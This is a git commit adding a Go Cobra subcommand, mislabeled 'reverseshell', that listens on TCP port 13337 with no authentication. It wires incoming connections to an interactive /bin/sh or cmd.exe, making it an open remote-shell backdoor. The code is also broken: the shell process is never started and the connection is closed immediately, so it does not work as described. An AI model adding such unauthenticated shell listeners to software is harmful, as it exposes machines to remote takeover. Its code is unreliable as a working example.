1c3b516e2a4f3c50d9bdac1b127cfc316531879a
Souvik Haldar <souvik@Souviks-MacBook-Pro.local>
2020-07-19 13:42:34 +0530

    Add reverse shell listener

---
+++ cmd/reverse_shell.go
@@ -0,0 +1,66 @@
+package cmd
+
+import (
+	"fmt"
+	"io"
+	"net"
+	"os/exec"
+	"runtime"
+
+	"github.com/spf13/cobra"
+)
+
+var rsPort string
+
+var rsCmd = &cobra.Command{
+	Use:   "reverseshell",
+	Short: "Remotely execute shell commands",
+	Long: `This server listens for command over the internet and executes it
+	in local shell`,
+	Run: func(cmd *cobra.Command, args []string) {
+		fmt.Println("Starting the listener for reverse shell on port ", rsPort)
+
+		listener, err := net.Listen("tcp", ":"+rsPort)
+		if err != nil {
+			fmt.Println("Unable to run the listener: ", err)
+			return
+		}
+		fmt.Println("Listening on: ", rsPort)
+		defer listener.Close()
+		for {
+			conn, err := listener.Accept()
+			if err != nil {
+				fmt.Println("Unable to take requests: ", err)
+				return
+			}
+			go handle(conn)
+
+		}
+	},
+}
+
+func handle(conn net.Conn) {
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd.exe")
+	} else {
+		cmd = exec.Command("/bin/sh", "-i")
+	}
+	// create a pipe for directing the stdin and stdout over the conn
+	// so that we don't need to flush the stdout to the conn
+	rp, wp := io.Pipe()
+	cmd.Stdin = conn
+	cmd.Stdout = wp
+	go func() {
+		if _, err := io.Copy(conn, rp); err != nil {
+			fmt.Println("Error in copying the stdout: ", err)
+		}
+	}()
+	conn.Close()
+}
+func init() {
+	rootCmd.AddCommand(rsCmd)
+	rsCmd.Flags().StringVar(&rsPort, "port", "13337", `
+	The port on which this reverse shell listen for coommands
+	`)
+}
